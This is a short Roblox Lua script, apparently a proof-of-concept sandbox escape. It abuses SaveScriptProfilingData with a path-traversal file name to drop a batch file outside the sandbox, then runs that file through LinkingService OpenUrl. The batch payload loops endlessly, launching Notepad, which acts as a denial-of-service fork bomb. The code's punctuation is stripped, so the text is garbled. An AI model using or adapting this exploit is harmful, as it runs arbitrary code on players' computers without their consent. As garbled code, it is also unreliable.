
local LinkingService = gameGetService(LinkingService)
local ScriptContext = gameGetService(ScriptContext)

local scriptContent = [[@ECHO off
top
START %SystemRoot%system32notepad.exe
GOTO top
]]

local payload = ScriptContextSaveScriptProfilingData(scriptContent, ........test.bat)
LinkingServiceOpenUrl(payload)
